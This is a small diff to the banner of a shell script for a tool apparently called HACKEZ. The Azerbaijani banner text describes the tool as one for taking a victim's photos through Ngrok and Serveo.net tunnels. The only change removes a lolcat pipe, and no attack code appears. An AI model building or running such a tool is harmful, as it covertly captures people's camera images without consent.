@@ -18,7 +18,7 @@ echo '
 │HACKEZ Tool-a xos gelmisiniz :)                                                                                                               │
 │Ngrok ve Serveo.net(local host) istifade ederek victim-in fotolarinin alinmasi aleti                                                                                                           │Termux ve Arch Linuxta test edilmisdir
 │Made in Azerbaijan Broooo                                                                                                                                                                     │
- ' |lolcat
+ '
 
                                                                                
 echo " "
